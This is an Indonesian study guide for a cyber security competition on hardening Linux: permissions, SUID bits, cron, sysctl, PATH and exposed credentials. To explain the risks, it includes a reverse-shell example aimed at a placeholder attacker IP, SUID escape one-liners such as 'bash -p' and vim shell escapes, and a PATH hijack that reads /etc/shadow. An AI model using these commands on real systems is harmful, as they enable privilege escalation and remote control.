# 05 — Common Linux Misconfigurations ⭐
#lks #cyber-security #linux #hardening #misconfiguration #suid #cron #kernel

> **Peran:** Defender | **OS:** Debian/Ubuntu-based | **Konteks:** LKS Cyber Security 2026
> **Topik Kisi-kisi:** Infrastructure Hardening → Linux → Common Linux Misconfigurations

---

## 🎯 Tujuan

Menemukan dan memperbaiki kesalahan konfigurasi Linux yang umum dieksploitasi attacker untuk:
- **Privilege escalation** → naik dari user biasa ke root
- **Akses ke data sensitif** → baca file yang tidak boleh dibaca
- **Persistence** → tetap ada di sistem meskipun sudah diusir

---

> 🧠 **Cara berpikir seperti defender yang baik:**
> "Sebelum attacker masuk dan cari celah — kamu harus sudah menemukan dan menutup semua celah itu lebih dulu!"
>
> Urutan pikir:
> 1. Apa yang bisa disalahgunakan?
> 2. Siapa yang bisa mengaksesnya?
> 3. Bagaimana cara memperbaikinya?

---

## 1. Memahami Permission — Fondasi Segalanya

Sebelum lanjut, pastikan kamu benar-benar paham ini (sudah dibahas di file 00b juga):

```
-rwxr-xr-x  1  root  root  12345  file.sh
│└──┘└──┘└──┘
│ │   │   └── Others (semua orang selain owner & group)
│ │   └────── Group
│ └────────── Owner (pemilik)
└──────────── Tipe: - = file, d = direktori, l = symlink

r = baca (4)   w = tulis (2)   x = jalankan (1)
```

**Tabel Permission yang Sering Keluar di Lomba:**

| File | Harus | Kenapa Itu? |
|------|-------|-------------|
| `/etc/passwd` | `644` | Semua user perlu baca, hanya root edit |
| `/etc/shadow` | `640` | Hanya root dan grup shadow bisa baca |
| `/etc/sudoers` | `440` | Hanya bisa dibaca, tidak bisa diedit (visudo yang edit) |
| `/etc/group` | `644` | Semua bisa baca info group |
| `/etc/gshadow` | `640` | Hanya root dan grup shadow |
| `/tmp` | `1777` | Semua bisa tulis, sticky bit mencegah hapus milik orang lain |
| `~/.ssh/` | `700` | Hanya pemilik yang boleh akses folder ini |
| `~/.ssh/authorized_keys` | `600` | Hanya pemilik yang boleh baca/tulis |

---

## 2. File SUID/SGID Berbahaya

### Apa itu SUID?

```
Normal:
User "alice" jalankan /usr/bin/cat → program berjalan dengan hak alice

SUID aktif di /usr/bin/cat milik root:
User "alice" jalankan /usr/bin/cat → program berjalan dengan hak ROOT!

Artinya: Alice bisa baca file /etc/shadow yang harusnya tidak bisa dia baca!
```

Tanda SUID di ls: huruf **s** di posisi execute owner
```
-rwsr-xr-x = ada SUID (huruf 's' bukan 'x')
-rwxr-xr-x = tidak ada SUID (normal)
```

### Cari Semua File SUID/SGID

```bash
# Cari semua file dengan SUID
find / -perm -4000 -type f 2>/dev/null

# Cari semua file dengan SGID
find / -perm -2000 -type f 2>/dev/null

# Cari keduanya sekaligus
find / -perm /6000 -type f 2>/dev/null

# Penjelasan 2>/dev/null:
# Perintah find sering menampilkan error "Permission denied" untuk folder tertentu
# 2>/dev/null = buang semua pesan error (2 = stderr, /dev/null = tempat sampah)
```

### SUID yang NORMAL (Jangan Diutak-atik!)

Program-program ini MEMANG harus punya SUID untuk berfungsi:

```
/usr/bin/sudo      ← sudo harus jalan sebagai root untuk bisa beri hak root
/usr/bin/passwd    ← passwd harus akses /etc/shadow untuk ganti password
/usr/bin/su        ← su harus bisa jadi user lain
/usr/bin/newgrp    ← untuk ganti grup aktif
/usr/bin/chsh      ← untuk ganti shell
/usr/bin/gpasswd   ← untuk kelola password grup
/bin/ping          ← ping butuh raw socket (perlu root)
/usr/bin/pkexec    ← PolicyKit, mirip sudo
/usr/bin/mount     ← mount filesystem
```

### SUID yang MENCURIGAKAN → HAPUS!

Jika kamu menemukan file-file ini punya SUID → **hapus SUID-nya segera!**

```
/bin/bash       ← SANGAT BERBAHAYA! Bisa dapat shell root dengan: bash -p
/bin/sh         ← Sama bahayanya
/bin/dash       ← Sama bahayanya
/usr/bin/find   ← Bisa eksekusi command: find / -exec whoami \;
/usr/bin/vim    ← Bisa buka shell: vim -c ':!/bin/bash'
/usr/bin/python3 ← Bisa jalankan script apapun
/usr/bin/perl   ← Sama
/usr/bin/nc     ← Netcat, bisa buat reverse shell
/usr/bin/cp     ← Bisa copy /etc/passwd ke tempat yang bisa ditulis
/usr/bin/less   ← Bisa jalankan shell dari dalam less: !bash
```

> 📚 **Referensi:** [GTFOBins](https://gtfobins.github.io) — database lengkap binary yang bisa dieksploitasi via SUID. Hafal ini!

### Cara Hapus Bit SUID

```bash
# Hapus bit SUID dari file tertentu
sudo chmod u-s /path/to/file

# Contoh:
sudo chmod u-s /usr/bin/find
sudo chmod u-s /bin/bash      # Jika ada yang iseng aktifkan ini

# Verifikasi berhasil dihapus:
ls -la /usr/bin/find
# Sebelum: -rwsr-xr-x (ada 's' = SUID aktif) ❌
# Sesudah: -rwxr-xr-x (sudah hilang) ✅
```

---

## 3. Sticky Bit dan Umask

### Sticky Bit di /tmp

`/tmp` adalah direktori yang bisa ditulis semua orang. Tanpa sticky bit → user bisa hapus file milik user lain!

```bash
# Cek sticky bit di /tmp
ls -ld /tmp

# Output yang BENAR (ada huruf 't' di akhir):
drwxrwxrwt 14 root root 4096 May 24 /tmp    ← ada 't' = sticky bit aktif ✅

# Output yang SALAH (tidak ada 't'):
drwxrwxrwx 14 root root 4096 May 24 /tmp    ← tidak ada 't' = BERBAHAYA! ❌
```

```bash
# Perbaiki jika sticky bit tidak ada:
sudo chmod +t /tmp
sudo chmod +t /var/tmp
# Atau menggunakan angka (1 di depan = sticky bit):
sudo chmod 1777 /tmp
sudo chmod 1777 /var/tmp

# Verifikasi:
ls -ld /tmp /var/tmp
```

### Umask — Default Permission untuk File Baru

Umask = "mask" yang mengurangi permission default saat file baru dibuat.

```
File baru default = 666 (rw-rw-rw-)
Dir baru default  = 777 (rwxrwxrwx)

Dengan umask 022:
  File baru: 666 - 022 = 644 (rw-r--r--)
  Dir baru:  777 - 022 = 755 (rwxr-xr-x)

Dengan umask 027 (lebih aman untuk server):
  File baru: 666 - 027 = 640 (rw-r-----)   ← others tidak bisa baca!
  Dir baru:  777 - 027 = 750 (rwxr-x---)   ← others tidak bisa masuk!
```

```bash
# Cek umask saat ini
umask

# Set umask lebih ketat untuk server
sudo nano /etc/login.defs
# Ubah baris: UMASK   022
# Menjadi:    UMASK   027

# Atau tambahkan ke /etc/profile (berlaku semua user saat login)
echo "umask 027" | sudo tee -a /etc/profile
```

---

## 4. File World-Writable Berbahaya

File yang bisa ditulis siapa saja = attacker bisa modifikasi isinya!

```bash
# Cari file world-writable (kecuali direktori yang memang perlu)
find / \
  -perm -o+w \
  -not -path "/proc/*" \
  -not -path "/sys/*" \
  -not -path "/dev/*" \
  -not -path "/run/*" \
  -type f \
  2>/dev/null

# Cari direktori world-writable selain /tmp dan /var/tmp
find / \
  -perm -o+w \
  -not -path "/proc/*" \
  -not -path "/sys/*" \
  -not -path "/tmp" \
  -not -path "/var/tmp" \
  -type d \
  2>/dev/null
```

**Perbaikan:**
```bash
# Hapus permission write untuk others
sudo chmod o-w /path/to/dangerous/file

# Atau set permission yang benar
sudo chmod 644 /path/to/config/file    # File konfigurasi biasa
sudo chmod 755 /path/to/script.sh      # Script yang perlu dijalankan semua
```

---

## 5. Permission File Konfigurasi Sensitif

```bash
# ===== CEK PERMISSION =====
ls -la /etc/passwd /etc/shadow /etc/sudoers /etc/group /etc/gshadow

# Contoh output yang BENAR:
# -rw-r--r-- 1 root root    /etc/passwd    (644) ✅
# -rw-r----- 1 root shadow  /etc/shadow    (640) ✅
# -r--r----- 1 root root    /etc/sudoers   (440) ✅
# -rw-r--r-- 1 root root    /etc/group     (644) ✅
# -rw-r----- 1 root shadow  /etc/gshadow   (640) ✅

# ===== PERBAIKI JIKA SALAH =====
sudo chmod 644 /etc/passwd
sudo chown root:root /etc/passwd

sudo chmod 640 /etc/shadow
sudo chown root:shadow /etc/shadow

sudo chmod 440 /etc/sudoers
sudo chown root:root /etc/sudoers

sudo chmod 644 /etc/group
sudo chown root:root /etc/group

sudo chmod 640 /etc/gshadow
sudo chown root:shadow /etc/gshadow
```

---

## 6. Cron Jobs Berbahaya

Cron job yang berjalan sebagai **root** tapi **script-nya bisa diedit user biasa** = privilege escalation!

### Kenapa Berbahaya?

```
Contoh cron berbahaya:
/etc/crontab mengandung:
* * * * * root /tmp/backup.sh
                ↑
                Script ini di /tmp yang bisa ditulis SIAPA SAJA!
                
Attacker bisa:
1. Ganti isi /tmp/backup.sh dengan: "bash -i >& /dev/tcp/attacker_ip/4444 0>&1"
2. Tunggu cron jalan (maksimal 1 menit)
3. Dapat reverse shell sebagai ROOT!
```

### Audit Semua Cron Job

```bash
# Crontab user biasa
crontab -l

# Crontab root
sudo crontab -l

# Cron sistem (yang sering berisi cron berbahaya)
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/
ls -la /etc/cron.hourly/

# Lihat isi semua file cron di /etc/cron.d/
for f in /etc/cron.d/*; do echo "=== $f ==="; cat "$f"; done
```

### Tanda Bahaya di Cron

```bash
# BERBAHAYA: script di /tmp atau /var/www
* * * * * root /tmp/backup.sh
* * * * * root python3 /var/www/html/script.py

# CEK: siapa yang bisa tulis script itu?
ls -la /tmp/backup.sh
# Output: -rwxrwxrwx = semua orang bisa edit! ❌

# AMAN: script di direktori yang hanya bisa diedit root
* * * * * root /usr/local/bin/backup.sh
# CEK:
ls -la /usr/local/bin/backup.sh
# Output: -rwx------ root root = hanya root ✅
```

### Perbaikan Cron

```bash
# Semua script yang dipanggil cron HARUS dimiliki root dan tidak bisa diedit user lain
sudo chown root:root /path/to/cron/script.sh
sudo chmod 700 /path/to/cron/script.sh    # Hanya root yang bisa akses (rwx------)

# Verifikasi
ls -la /path/to/cron/script.sh
# Output yang benar: -rwx------ 1 root root ...
```

---

## 7. Kernel & OS Update

Kernel yang tidak diupdate = rentan terhadap exploit publik yang sudah diketahui!

> Contoh exploit kernel terkenal:
> - **Dirty Cow** (CVE-2016-5195) → privilege escalation
> - **Dirty Pipe** (CVE-2022-0847) → write ke file read-only
> - **PwnKit** (CVE-2021-4034) → privilege escalation via pkexec

```bash
# Cek versi kernel saat ini
uname -r
uname -a

# Update semua package (termasuk kernel)
sudo apt update
sudo apt upgrade -y

# Full upgrade (termasuk dependency yang berubah)
sudo apt full-upgrade -y

# Khusus security patch
sudo apt-get install unattended-upgrades -y
sudo dpkg-reconfigure unattended-upgrades
# Pilih "Yes"

# Aktifkan service auto-update
sudo systemctl enable unattended-upgrades
sudo systemctl start unattended-upgrades
```

---

## 8. Kernel Hardening via sysctl (SANGAT PENTING!)

sysctl mengatur parameter kernel Linux. Ini salah satu topik yang SERING keluar di lomba!

```bash
sudo nano /etc/sysctl.conf
```

Tambahkan konfigurasi berikut (lengkap dengan penjelasan):

```ini
# ============================================================
# NETWORK SECURITY — Proteksi Serangan Jaringan
# ============================================================

# Cegah IP spoofing (paket dengan IP sumber palsu)
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.default.rp_filter = 1
# rp_filter = reverse path filtering: verifikasi bahwa balasan paket
# keluar dari interface yang sama dengan masuknya paket tersebut

# Cegah ICMP redirect attack (attacker manipulasi tabel routing)
net.ipv4.conf.all.accept_redirects = 0
net.ipv6.conf.all.accept_redirects = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.default.accept_redirects = 0

# Cegah SYN flood attack (jenis DDoS paling klasik)
net.ipv4.tcp_syncookies = 1
# SYN cookies: server tidak alokasi resource sampai koneksi benar-benar established

# Abaikan ICMP broadcast ping (cegah Smurf attack)
net.ipv4.icmp_echo_ignore_broadcasts = 1

# Tolak paket source-routed (paket yang tentukan jalurnya sendiri)
net.ipv4.conf.all.accept_source_route = 0
net.ipv6.conf.all.accept_source_route = 0

# Catat paket dengan alamat yang mencurigakan ke log (martian packets)
net.ipv4.conf.all.log_martians = 1
net.ipv4.conf.default.log_martians = 1

# Nonaktifkan IPv6 jika tidak digunakan (kurangi attack surface)
net.ipv6.conf.all.disable_ipv6 = 1
net.ipv6.conf.default.disable_ipv6 = 1
net.ipv6.conf.lo.disable_ipv6 = 1

# ============================================================
# KERNEL SECURITY — Proteksi Sistem Operasi
# ============================================================

# ASLR — Address Space Layout Randomization
# Acak lokasi memori (stack, heap, library) setiap kali program dijalankan
# Level 2 = maksimal (semua diacak)
kernel.randomize_va_space = 2
# Tanpa ASLR: attacker tahu persis di mana letak fungsi di memori → mudah exploit
# Dengan ASLR: attacker tidak bisa prediksi alamat memori → exploit jauh lebih sulit

# Batasi akses ke dmesg (log kernel) hanya untuk root
kernel.dmesg_restrict = 1
# dmesg sering mengandung informasi sensitif tentang hardware dan sistem

# Sembunyikan pointer kernel dari user biasa
kernel.kptr_restrict = 2
# Pointer kernel bisa dipakai untuk bypass ASLR

# Nonaktifkan magic sysrq key (mencegah reboot/crash mendadak via keyboard)
kernel.sysrq = 0

# Cegah core dump dari SUID program (core dump bisa mengandung data sensitif)
fs.suid_dumpable = 0

# ============================================================
# FILE SYSTEM SECURITY
# ============================================================

# Cegah hard link attack
fs.protected_hardlinks = 1
# Tanpa ini: user bisa buat hard link ke file milik root

# Cegah symlink attack
fs.protected_symlinks = 1
# Tanpa ini: user bisa buat symlink berbahaya di /tmp
```

**Terapkan tanpa reboot:**
```bash
# Terapkan semua perubahan sekarang (tanpa perlu reboot)
sudo sysctl -p

# Verifikasi beberapa parameter penting
sudo sysctl net.ipv4.tcp_syncookies
# Output: net.ipv4.tcp_syncookies = 1 ✅

sudo sysctl kernel.randomize_va_space
# Output: kernel.randomize_va_space = 2 ✅

sudo sysctl kernel.dmesg_restrict
# Output: kernel.dmesg_restrict = 1 ✅
```

---

## 9. PATH Hijacking

Jika PATH mengandung direktori yang bisa ditulis user biasa → attacker bisa buat program palsu!

```
Skenario PATH hijacking:
1. PATH berisi: .:/home/alice:/usr/bin:/bin
2. Attacker buat file "ls" di /home/alice dengan isi: cat /etc/shadow
3. Root jalankan "ls" → sebenarnya menjalankan program palsu milik attacker!
4. Attacker dapat isi /etc/shadow!
```

```bash
# Cek PATH saat ini
echo $PATH

# PATH yang BERBAHAYA (ada . atau direktori yang bisa ditulis user biasa):
# PATH=.:/home/user/.local/bin:/usr/local/bin:/usr/bin:/bin    ← ada "."!

# PATH yang AMAN:
# PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Perbaikan:
sudo nano /etc/environment
# Pastikan PATH tidak ada "." dan tidak ada direktori writable user biasa
```

```bash
# Verifikasi secure_path di sudoers sudah dikonfigurasi
sudo grep "secure_path" /etc/sudoers
# Output: Defaults secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```

---

## 10. Informasi Sensitif yang Terekspos

```bash
# ===== CARI FILE KONFIGURASI BERISI PASSWORD =====
grep -r "password\|passwd\|secret" /etc/ --include="*.conf" 2>/dev/null

# Cari di direktori web
grep -r "password\|secret\|token" /var/www/ 2>/dev/null

# Cari file .env (sering berisi credentials)
find / -name ".env" -not -path "/proc/*" 2>/dev/null

# Cari file wp-config.php (database password WordPress)
find / -name "wp-config.php" 2>/dev/null

# ===== CEK BASH HISTORY =====
cat ~/.bash_history
sudo cat /root/.bash_history
# Sering ada command seperti: mysql -u root -pPasswordRahasia123!

# Bersihkan history sensitif
history -c
cat /dev/null > ~/.bash_history

# Mencegah history menyimpan command sensitif
# Command yang diawali spasi tidak disimpan
echo "HISTCONTROL=ignoreboth" >> ~/.bashrc
```

---

## 11. Hosts.equiv dan .rhosts — File Berbahaya

File ini memberikan akses tanpa password ke sistem. HARUS dihapus!

```bash
# Cek keberadaannya
cat /etc/hosts.equiv 2>/dev/null     # File global
cat ~/.rhosts 2>/dev/null            # File per-user
cat /root/.rhosts 2>/dev/null        # File root

# Jika ada isinya → HAPUS atau kosongkan!
sudo rm -f /etc/hosts.equiv
sudo rm -f ~/.rhosts
sudo rm -f /root/.rhosts

# Atau kosongkan saja
sudo truncate -s 0 /etc/hosts.equiv
```

---

## ✅ Checklist Common Misconfigurations (Untuk Lomba!)

### Permissions & SUID
- [ ] Cari file SUID: `find / -perm -4000 -type f 2>/dev/null`
- [ ] Tidak ada SUID pada: bash, sh, find, vim, python3, perl, nc, cp
- [ ] Hapus SUID yang berbahaya: `sudo chmod u-s /path/file`
- [ ] `/tmp` punya sticky bit: `ls -ld /tmp` → harus ada 't'
- [ ] `/var/tmp` punya sticky bit
- [ ] Tidak ada file world-writable di luar `/tmp` dan `/dev`
- [ ] `/etc/passwd` = 644, root:root
- [ ] `/etc/shadow` = 640, root:shadow
- [ ] `/etc/sudoers` = 440, root:root
- [ ] Umask = 027 di `/etc/login.defs`

### Cron
- [ ] Audit cron: `cat /etc/crontab`, `ls /etc/cron.d/`
- [ ] Script yang dipanggil cron TIDAK ada di /tmp atau direktori writable
- [ ] Script cron dimiliki root: `chown root:root script.sh`
- [ ] Script cron permission 700: `chmod 700 script.sh`

### Kernel & Update
- [ ] `sudo apt upgrade -y` sudah dijalankan
- [ ] `unattended-upgrades` aktif
- [ ] `sudo sysctl -p` sudah dijalankan
- [ ] `kernel.randomize_va_space = 2` (ASLR)
- [ ] `net.ipv4.tcp_syncookies = 1` (cegah SYN flood)
- [ ] `kernel.dmesg_restrict = 1`
- [ ] `net.ipv4.conf.all.accept_redirects = 0`
- [ ] `net.ipv4.conf.all.log_martians = 1`

### Informasi Sensitif
- [ ] Tidak ada file .env berisi password di web root
- [ ] Bash history sensitif dibersihkan
- [ ] `/etc/hosts.equiv` dihapus atau kosong
- [ ] `~/.rhosts` dan `/root/.rhosts` tidak ada
- [ ] PATH tidak mengandung `.`

---

## 🔗 Navigasi

← `04_Dangerous_Exposed_Services`
→ `06_Logging`
